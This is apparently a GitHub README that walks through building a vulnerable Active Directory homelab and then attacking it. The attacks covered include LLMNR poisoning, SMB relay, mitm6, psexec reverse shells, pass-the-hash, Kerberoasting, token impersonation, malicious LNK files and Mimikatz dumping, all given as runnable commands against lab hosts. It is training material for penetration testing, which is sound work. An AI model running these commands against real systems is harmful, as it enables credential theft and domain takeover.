![Active Directory Homelab Architecture](https://github.com/prakharvrx/Active-Directory-Homelab-and-Attack-Simulation/raw/main/Active%20Directory.jpg)

---

# Important Note
This Active Directory homelab environment was built with guidance from tcm security﻿. It is designed to provide hands-on experience with AD setup, configuration, and common attack techniques for cybersecurity learning and practice.

---

# Active Directory Lab

## Lab Requirements

- 1 Windows Server
    
- 2 Windows 10 Workstations
    
    - 60 GB Disk Space
        
    - 16 GB RAM
        
- Install VMware Tools after setting up the Windows Server 2022 VM and the 2 Windows 10 VMs in VMware.
    

## Windows Server 2022 Configuration

- **Hostname:** `HYDRA-DC`
    
- **Domain Admin User:** `administrator` with password `P0$$w0rd!`
    
- **Network Configuration:** Set a static IPv4 address via `Control Panel\Network and Internet\Network Connections`
    
    - IP Address: `192.168.31.90`
        
- **Server Roles to Install:**
    
    - Active Directory Domain Services
        
    - Active Directory Certificate Services
        
- **Domain Name:** `MARVEL.local`
    
- **Active Directory Users and Computers Setup:**
    
    - Duplicate the `Administrator` user to create:
        
        - Second domain admin: `tstark` (password hidden)
            
        - Service account: `SQLService` with password `MYpassword123#`
            
    - Create regular users:
        
        - `fcastle`:`Password1`
            
        - `pparker`:`Password1`
            
- **File and Storage Services:** Create a new SMB share called `hackme`
    
- **Group Policy Management:**
    
    - Create an enforced GPO: `Disable Windows Defender`
        
    - Path: Computer Configuration → Policies → Administrative Templates → Windows Components → Microsoft Defender Antivirus
        
    - Enable: `Turn off Microsoft Defender Antivirus`
        
- **Register Service Principal Name (SPN) for SQLService**
    

```bash
setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService
setspn -T MARVEL.local -Q */*
```

- **Set Timezone in PowerShell (admin):**
    

```bash
Set-TimeZone "W. Europe Standard Time"
```

## Windows 10 Workstations Configuration

- **Hostname1:** `THEPUNISHER`
    
    - User: `frankcastle`:`Password1`
        
- **Hostname2:** `SPIDERMAN`
    
    - User: `peterparker`:`Password1`
        
- **DNS:** Set both VMs to use DNS IP `192.168.31.90`
    
- **Domain Join:** Join both to `MARVEL.local` domain using `MARVEL\administrator`:`P0$$w0rd!`
    
- **Edit Local Users and Groups:**
    
    - Reset and enable local `Administrator` account to `Password1!`
        
    - Add domain users to local Administrators group:
        
        - `fcastle` on `THEPUNISHER`
            
        - Both `fcastle` and `pparker` on `SPIDERMAN`
            
- **Network Settings:** Enable `Network discovery` and `File sharing`
    
- **SPIDERMAN:** Log off domain user and log in locally as `.\peterparker` with `Password1`
    
- **Map Network Drive:** `\\HYDRA-DC\hackme` and reconnect at sign-in with different credentials
    

## VM IP Addresses

|VM|IP|
|---|---|
|hydra-dc.MARVEL.local|192.168.31.90|
|spiderman.MARVEL.local|192.168.31.92|
|thepunisher.MARVEL.local|192.168.31.93|

## Kali VM /etc/hosts Setup

Add the following lines to `/etc/hosts`:

```bash
192.168.31.90  hydra-dc.MARVEL.local  
192.168.31.92  spiderman.MARVEL.local  
192.168.31.93  thepunisher.MARVEL.local  
```

---
# AD Initial Attack Vectors
AD Initial Attack Vectors are the methods attackers first use to enter or compromise an Active Directory (AD) environment. This is especially relevant when building a homelab to understand how real-life attacks begin. These vectors exploit weaknesses or misconfigurations that allow attackers to gain a foothold in the AD setup.

## What is DNS?

DNS (Domain Name System) is like the phonebook of the internet. It converts human-friendly domain names (e.g., `example.com`) into IP addresses (e.g., `192.168.1.1`) that computers use for communication. When you enter a website name in your browser, DNS provides the IP address needed to connect.

**How DNS Works:**

1. You enter a domain name (e.g., `www.geeksforgeeks.org`) in a browser.
    
2. The system checks the local DNS cache.
    
3. If not found, it queries a DNS resolver server.
    
4. The resolver contacts root DNS servers, then TLD servers (e.g., `.org`), then authoritative DNS servers.
    
5. The authoritative server responds with the IP address.
    
6. Your device connects using the IP address.
    

DNS simplifies browsing by hiding IP addresses behind easy-to-remember domain names.

## What is LLMNR?

LLMNR (Link-Local Multicast Name Resolution) is a fallback protocol that operates within a local network when DNS fails to resolve a hostname. If the DNS server is unreachable or doesn’t know a hostname, LLMNR sends a multicast query asking "Who knows this hostname?".

**How LLMNR Works:**

- The computer broadcasts the name query to all devices on the local subnet.
    
- A device with the matching hostname replies with its IP.
    
- The querying computer connects to that IP.
    

LLMNR operates only within local networks and acts as a backup when DNS resolution fails.

## When and Why DNS Fails

Common reasons for DNS failure include:

- DNS server downtime or network connectivity issues.
    
- Incorrect or misspelled hostnames.
    
- Corrupted DNS cache.
    
- Firewalls or network devices blocking DNS queries.
    

In these cases, LLMNR automatically tries to resolve the hostname locally.

## What is Responder?

Responder is a pentesting tool that exploits LLMNR and NetBIOS Name Service on local networks. It listens for name resolution requests and responds maliciously, pretending to be the requested host.

**How Responder Works:**

1. It captures LLMNR or NetBIOS name requests on the network.
    
2. Responds to the victim claiming to be the host requested.
    
3. The victim connects and sends hashed credentials.
    
4. The attacker collects these hashes and attempts to crack them.
    

Responder is used primarily for testing or exploiting weak network configurations reliant on LLMNR.

## Summary

- **DNS:** Global system performing domain-to-IP mapping.
    
- **LLMNR:** Local network backup name resolution protocol.
    
- **Responder:** Tool exploiting LLMNR to capture credentials.
    

## Responder Tool Installation and Usage

Source: [https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

- Supports NTLMv1, NTLMv2, LMv2 with NTLMSSP extended security.
    
- Built-in HTTP, HTTPS, and MSSQL authentication servers.
    

```bash
sudo apt autoremove --purge responder -y && sudo apt autoclean
sudo rm -rf /usr/share/responder/
sudo apt install responder -y
```

Run Responder on interface `eth0`:

```bash
sudo responder -I eth0 -dPv
```

- From the `THEPUNISHER` VM, login with user `fcastle` and open Windows Explorer to access `\\192.168.31.131` (Kali IP).
    
- This triggers an LLMNR query caught by Responder.
    
- The victim’s username and NTLMv2 password hash are captured.
    

## Cracking the NTLMv2 Hash

Save the captured hash to a `hashes.txt` file, then crack using `hashcat`:

```bash
mkdir -p ~/tcm/peh/ad-attacks
cd ~/tcm/peh/ad-attacks

nano hashes.txt

# Paste captured hash in hashes.txt
fcastle::MARVEL:326a2463163fdc3c:F7960DB37F933089E086898EC14E6C78:[...hash truncated...]

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

# SMB Relay Attack
SMB Relay attack occurs when an attacker intercepts a user's login request and forwards (relays) it to another system to impersonate the user without knowing their password.

## Step-by-Step SMB Relay Attack Process:

1. **Scan Network for Vulnerable Systems**  
    The attacker scans for systems running SMB without SMB signing enabled (which prevents this attack).
    
2. **Man-in-the-Middle Position**  
    Attacker places themselves between victim and server (using ARP spoofing or DNS poisoning) to capture traffic.
    
3. **Intercept Authentication Requests**  
    Victim sends NTLM hashed credentials which the attacker captures.
    
4. **Relay Credentials to Another Server**  
    Attacker forwards hashes to another SMB server accepting them without verifying origin.
    
5. **Gain Unauthorized Access**  
    Target server grants access thinking attacker is legitimate user.
    
6. **Do Further Actions**  
    Attacker explores network, steals data, or escalates privileges.
    

## Why It Works

- SMB signing often disabled in networks, enabling this attack.
    
- NTLM authentication lacks origin verification.
    
- Allows relay of hashes without cracking passwords.
    

## Identify Hosts Without SMB Signing

Run the following nmap scan:

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.31.90-93 -Pn
```

Example output snippet:

```bash
Nmap scan report for hydra-dc.MARVEL.local (192.168.31.90)
Host is up (0.00034s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

Hosts with "Message signing enabled but not required" are vulnerable.

Verify SMB signing registry setting:

```bash
reg query HKLM\System\CurrentControlSet\Services\LanManServer\Parameters | findstr /I securitysignature
```

## Setup Targets for Relay

Create a `targets.txt` file with vulnerable IPs:

```bash
echo -e "192.168.31.92\n192.168.31.93" > targets.txt
```

## Configure Responder

Edit Responder config:

```bash
sudo nano /etc/responder/Responder.conf
```

Set:

```bash
SMB = Off
HTTP = Off
```

Run Responder:

```bash
sudo responder -I eth0 -dPv
```

## Launch NTLM Relay with ntlmrelayx.py

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

From `THEPUNISHER` VM, login as `fcastle` and open WinExplorer, navigate to `\\192.168.31.131` (Kali IP) to trigger relay.

Captured local SAM hashes from `SPIDERMAN` saved in `192.168.31.92_samhashes.sam`:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:60d1d3dc4291fca471e146c798f8d603:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```
## Start Interactive SMB Shell

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -
```

Output:

```bash
[*] Authenticating against smb://192.168.31.92 as MARVEL\fcastle SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

Connect to shell:

```bash
nc 127.0.0.1 11000
```

Run commands:

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

## Using Metasploit Framework (msfconsole) for Psexec Exploit

Launch:

```bash
msfconsole
```

Search and use psexec module:

```bash
search psexec
use exploit/windows/smb/psexec
```

Configure exploit:

```bash
set payload windows/x64/meterpreter/reverse_tcp
set rhosts 192.168.31.93
set smbdomain MARVEL.local
set smbuser fcastle
set smbpass Password1
show targets
run
```

Background session:

```bash
background
sessions
session 1
```

Switch to admin with hash:

```bash
set smbuser administrator
unset smbdomain
set smbpass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
run
```

## psexec.py Shell Access Commands

```bash
psexec.py MARVEL.local/fcastle:'Password1'@192.168.31.93
psexec.py MARVEL.local/fcastle:@192.168.31.93
psexec.py administrator@192.168.31.93 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

# IPv6 DNS Takeover
IPv6 DNS Takeover is an attack technique targeting IPv6 networks, especially in Windows Active Directory environments, where an attacker intercepts and takes control of DNS services using IPv6.

## What is IPv6 DNS Takeover?

- Windows systems in IPv6 networks often rely on DHCPv6 and router advertisements for network configuration, including DNS server addresses.
    
- The attacker sends fake DHCPv6 responses and router advertisements, tricking victim machines into using the attacker's machine as their DNS server.
    
- Once the attacker is the victim’s DNS server, they can intercept and manipulate DNS queries, redirecting traffic to malicious servers and enabling credential theft and other attacks.
    

## How IPv6 DNS Takeover Works?

1. **DHCPv6 and Router Advertisement Spoofing:**  
    The attacker uses a tool such as `mitm6` to send forged DHCPv6 and router advertisement packets on the local network.
    
2. **Victim Accepts Attacker as DNS:**  
    Victim machines accept the fake messages, configuring the attacker’s machine as their DNS server instead of the legitimate one.
    
3. **DNS Query Interception:**  
    All DNS requests from the victim flow through the attacker, allowing DNS spoofing or redirection.
    
4. **Facilitates Further Attacks:**  
    This access enables attacks like credential relay, man-in-the-middle, or phishing by redirecting valid traffic to malicious endpoints.
    

## Real-World Use Case

- After running `mitm6` and taking over DNS, the attacker can relay NTLM authentication attempts from victims to target domain controllers, capturing credentials or gaining unauthorized access.
    
- Rogue services can be created, and service tickets intercepted for further exploitation.
    

## Mitigation Recommendations

- Block DHCPv6 and router advertisement packets via firewall or Windows Group Policy.
    
- Disable automatic proxy detection methods like WPAD if unused.
    
- Enable LDAP signing and channel binding to secure LDAP communication.
    
- Limit sensitive or administrative account permissions to prevent impersonation.
    

## Summary

IPv6 DNS Takeover tricks victim systems into using a malicious DNS server in IPv6 networks, enabling the attacker to intercept and manipulate network traffic for deeper attacks.

## Commands for Attack Execution

```bash
sudo ntlmrelayx.py -6 -t ldaps://hydra-dc.MARVEL.local -wh fakewpad.MARVEL.local -l lootme
```

```bash
sudo mitm6 -d MARVEL.local
```

- After launching the attack, reboot the `THEPUNISHER` VM and monitor the `ntlmrelayx.py` output.
    
- Navigate to the `~/tcm/peh/ad-attacks/lootme` directory to find collected data on domain users, computers, groups, policies, etc.
    
- Log in on `THEPUNISHER` with `MARVEL\administrator` to verify successful compromise.
    
- Note that a new user `bkVKFfXduD` is created as part of the attack.

---
# AD - Post Compromise Enumeration
Post-compromise enumeration involves gathering detailed Active Directory data after initial access to identify users, permissions, shares, and vulnerabilities. This information helps in expanding control and enables deeper exploitation within the AD environment.

## ldapdomaindump

Tool: [ldapdomaindump GitHub](https://github.com/dirkjanm/ldapdomaindump)
An Active Directory information dumper that extracts:

- Valuable targets
    
- Domain users
    
- Other access details
    
- Descriptions
    
- Domain Admins, Enterprise Admins, Computers, etc.
    

## Usage:

```bash
mkdir -p ~/tcm/peh/ad-attacks/marvel.local
cd ~/tcm/peh/ad-attacks/marvel.local

sudo pip install -U ldap3
sudo pip install pycryptodome

sudo ldapdomaindump ldaps://hydra-dc.MARVEL.local -u 'MARVEL\fcastle' -p Password1
```

## Output files generated:

```bash
- domain_computers.grep
- domain_computers.html
- domain_computers.json
- domain_computers_by_os.html
- domain_groups.grep
- domain_groups.html
- domain_groups.json
- domain_policy.grep
- domain_policy.html
- domain_policy.json
- domain_trusts.grep
- domain_trusts.html
- domain_trusts.json
- domain_users.grep
- domain_users.html
- domain_users.json
- domain_users_by_group.html
```

These files provide comprehensive insight into the AD structure and permissions for further analysis.

# BloodHound
BloodHound uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment.

Source: [https://github.com/SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound)

## Installation and Setup

Install BloodHound Python ingestor:

```bash
sudo pip3 install bloodhound
```

Start the Neo4j database:

```bash
sudo neo4j console
```

Open the BloodHound web interface at [http://localhost:7474/](http://localhost:7474/) and configure the database user:

- Username: `neo4j`
    
- Password: `neo4jbh`
    

Login to BloodHound with this user.

## Data Collection

Create a directory and run the BloodHound Python ingestor to collect AD data:

```bash
mkdir -p ~/tcm/peh/ad-attacks/bloodhound
cd ~/tcm/peh/ad-attacks/bloodhound

sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns 192.168.31.90 -c all
```

Example output:

```bash
INFO: Found AD domain: marvel.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: hydra-dc.marvel.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: hydra-dc.marvel.local
INFO: Found 9 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SPIDERMAN.MARVEL.local
INFO: Querying computer: THEPUNISHER.MARVEL.local
INFO: Querying computer: hydra-dc.MARVEL.local
INFO: Done in 00M 01S
```

The following JSON files will be generated:
```bash
- computers.json
- containers.json
- domains.json
- gpos.json
- groups.json
- ous.json
- users.json
```

## Importing Data

In the BloodHound interface, upload all the `.json` files via the **Upload Data** option.

Explore the collected data using **Node Info** and **Analysis** features to identify interesting privileges and relationships.

# Purple Knight
Purple Knight is a standalone utility that queries Active Directory and Entra ID for multiple security tests. It assesses areas including delegation, account security, infrastructure, Group Policy, and Kerberos security posture.

Source: [https://www.semperis.com/purple-knight/resources/](https://www.semperis.com/purple-knight/resources/)

**Note:** Purple Knight recently updated its scoring method in version 4.3. The latest versions receive periodic indicator updates, while version 4.2 maintains the original scoring but no longer supports indicator updates.

---
# AD Post Compromise Attacks
Active Directory post-compromise attacks occur after an initial breach to escalate privileges and gain greater control over the AD environment.


## Pass-the-Hash (PtH)

Pass-the-Hash is a technique that uses captured NTLM password hashes to authenticate without cracking the password.

## Using CrackMapExec (CME)

CrackMapExec is a post-exploitation tool that automates security assessment in large AD networks.

Basic authentication test with valid credentials:

```bash
crackmapexec smb 192.168.31.0/24 -u fcastle -d MARVEL.local -p Password1
```

Using the `administrator` hash captured from the SAM dump:

```bash
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

Commands to extract information:

```bash
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
```

List modules and export credentials:

```bash
crackmapexec smb -L
crackmapexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy

# Within CME shell environment
cmedb
hosts
creds
export creds detailed cme_creds
```


## netexec

NetExec is a tool to execute commands on machines using SMB and NTLM authentication.

Install via pipx:

```bash
sudo apt install pipx git
pipx ensurepath
pipx uninstall netexec
pipx install git+https://github.com/Pennyw0rth/NetExec
```

Run netexec with LSASS module:

```bash
netexec smb 192.168.31.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
```

## secretsdump.py

Secretsdump extracts credential hashes from target machines, useful after initial foothold to expand access.

Workflow demonstration:

- Obtain and crack `fcastle`'s password hash via LLMNR.
    
- Use cracked password to access other machines.
    
- Extract cached credentials and local admin hashes.
    
- Perform password spraying using discovered local accounts.
    

Commands:

```bash
secretsdump.py MARVEL.local/fcastle:'Password1'@spiderman.MARVEL.local
secretsdump.py MARVEL.local/fcastle:'Password1'@thepunisher.MARVEL.local

secretsdump.py administrator:@spiderman.MARVEL.local -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

Sample credential output:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
frankcastle:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
peterparker:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::

[*] Dumping cached domain logon information (domain/username:hash)
MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#c7154f935b7d1ace4c1d72bd4fb7889c: (2024-07-15 21:58:30)
MARVEL.LOCAL/fcastle:$DCC2$10240#fcastle#e6f48c2526bd594441d3da3723155f6f: (2024-07-28 18:56:22)
MARVEL.LOCAL/pparker:$DCC2$10240#pparker#9f28ff35b303d014c9e85e35ab47d019: (2024-07-28 19:01:19)
```

## NTLMv1 Hash Cracking

To crack NTLMv1 hashes use hashcat:

```bash
echo '7facdc498ed1680c4fd1448319a8c04f' > ntlm.txt

hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# Result
7facdc498ed1680c4fd1448319a8c04f:Password1!
```

# Kerberoasting

Kerberoasting is a post-exploitation technique targeting service accounts with Service Principal Names (SPNs) by requesting Ticket Granting Service (TGS) tickets from the Key Distribution Center (KDC) and attempting to crack them offline.

## Using GetUserSPNs.py

Request SPN tickets for accounts with SPNs:

```bash
sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 192.168.31.90 -request
```

Example output:

|ServicePrincipalName|Name|MemberOf|PasswordLastSet|LastLogon|Delegation|
|---|---|---|---|---|---|
|HYDRA-DC/SQLService.MARVEL.local:60111|SQLService|CN=Group Policy Creator Owners,OU=Groups...|2024-07-15 23:38:40.092|2024-07-28 20:48:12.180||

TGS hash sample for cracking:

```bash
$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$4dd81eff0870ad344d1eee4aa64e2e7e$...
```

Save to file and crack with hashcat:

```bash
nano krb.txt

hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt

# Password found:
MYpassword123#
```

# Token Impersonation
Tokens act as temporary keys to access systems or networks without repeatedly entering credentials, similar to browser cookies.

- **Delegate Tokens:** Used for interactive logins or Remote Desktop sessions.
    
- **Impersonate Tokens:** Non-interactive tokens used to impersonate users.
    


## Practical Steps

1. Power on the `THEPUNISHER` (192.168.31.93) and `HYDRA-DC` (192.168.31.90) VMs, then log into `THEPUNISHER`.
    
2. Launch Metasploit:
    

```bash
msfconsole
```

3. Use the SMB psexec exploit module:
    

```bash
use exploit/windows/smb/psexec

set payload windows/x64/meterpreter/reverse_tcp
set rhosts 192.168.31.93
set smbdomain MARVEL.local
set smbuser fcastle
set smbpass Password1
show targets  # Proceed automatically or choose target

run
```

4. Load the incognito meterpreter addon to manipulate tokens:
    

```bash
load incognito
list_tokens -u
```

You'll see lists of **Delegation Tokens** (e.g., `MARVEL\Administrator`, `MARVEL\fcastle`, `NT AUTHORITY\SYSTEM`) and **Impersonation Tokens** (may be none).

5. To impersonate a token:
    
```bash
impersonate_token marvel\\fcastle
```

6. Verify impersonation:
    
```bash
shell
whoami
```

7. Create a new domain admin user:
    
```bash
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

8. Revert to your original token:
    

```bash
rev2self
```

9. Use newly created user to dump secrets from the domain controller:
    
```bash
secretsdump.py MARVEL.local/hawkeye:'Password1@'@hydra-dc.MARVEL.local
```


## Mitigations for Token Abuse

- Limit permissions to create tokens for users/groups.
    
- Implement account tiering to separate privileged accounts.
    
- Restrict local administrators on endpoints.
    


# LNK File Attack

Attackers drop malicious shortcut files (`.lnk`) in shared folders. When opened, these shortcuts can initiate SMB requests leaking credentials captured by tools like Responder.


## Example: Creating a Malicious Shortcut on `THEPUNISHER`

Run this PowerShell script on `THEPUNISHER` (192.168.31.93):

```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.31.131\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

Rename the file to `@test.lnk` to make it appear at the top of folder listings and copy it into the `\\hydra-dc\hackme` SMB share.


## Using Responder on Kali to Capture Hashes

```bash
sudo responder -I eth0 -dPv
```

Open the `\\hydra-dc\hackme` share folder on `THEPUNISHER`. Responder will automatically capture any password hashes triggered by shortcut file access.


## Automated LNK Attack via NetExec

If the file share is exposed and writable, use the `slinky` module in NetExec to create malicious shortcut files remotely:

```bash
netexec smb 192.168.31.131 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.31.90
```

# Group Policy Preferences (GPP) - cPassword Attacks

- GPP allowed embedded credentials in policies as encrypted cPassword fields.
    
- Encryption key was leaked, allowing straightforward decryption.
    
- This vulnerability was patched in MS14-025, but pre-existing stored credentials remain exploitable.
    

## Searching for GPP cPasswords

```bash
findstr /S /I cpassword \\marvel.local\sysvol\marvel.local\policies\*.xml
```

## Mitigations

- Install security update KB2962486 on all systems managing GPOs to prevent storing new credentials in GPP.
    
- Remove existing XML files containing passwords from SYSVOL.
    

For a detailed guide, see: [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences – Active Directory Security](https://adsecurity.org/?p=2288)

# Credential Dumping with Mimikatz

[Mimikatz](https://www.kali.org/tools/mimikatz/) extracts plaintext passwords, hashes, PINs, and Kerberos tickets from memory and supports attacks like Pass-the-Hash, Pass-the-Ticket, and Golden Ticket creation.

## Setup and Usage on `SPIDERMAN` (192.168.31.92)

1. Login as `peterparker` and mount the `hackme` share.
    
2. Prepare Mimikatz folder:
    

```bash
mkdir -p $HOME/tcm/peh/ad-attacks/mimikatz
cd $HOME/tcm/peh/ad-attacks/mimikatz
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
python3 -m http.server 80
```

3. On `SPIDERMAN` VM, download Mimikatz files from:
    

```bash
http://192.168.31.131/mimikatz_trunk/x64/
```

3. Run Command Prompt as administrator and launch Mimikatz:
    
```bash
cd "C:\Users\peterparker\Downloads"
mimikatz.exe
```

## Key Commands

```bash
privilege::debug

sekurlsa::msv          # Lists LM & NTLM credentials
sekurlsa::wdigest      # Lists WDigest credentials
sekurlsa::kerberos     # Lists Kerberos credentials
sekurlsa::tspkg        # Lists TsPkg credentials
sekurlsa::livessp      # Lists LiveSSP credentials
sekurlsa::cloudap      # Lists CloudAp credentials
sekurlsa::ssp          # Lists SSP credentials
sekurlsa::logonPasswords  # Lists all available provider credentials
sekurlsa::process      # Switch (or reinit) LSASS process context
sekurlsa::minidump     # Switch (or reinit) LSASS minidump context
sekurlsa::bootkey      # Attempts to decrypt LSA Isolated credentials
sekurlsa::pth          # Pass-the-hash
sekurlsa::krbtgt       # Kerberos Ticket Granting Ticket info
sekurlsa::dpapisystem  # DPAPI_SYSTEM secret keys
sekurlsa::trust        # Trust information
sekurlsa::backupkeys   # Preferred backup master keys
sekurlsa::tickets      # List Kerberos tickets
sekurlsa::ekeys        # List Kerberos encryption keys
sekurlsa::dpapi        # List cached master keys
sekurlsa::credman      # List credential manager secrets
```

Check for plaintext passwords and NTLM hashes based on mounted shares or sessions.

---
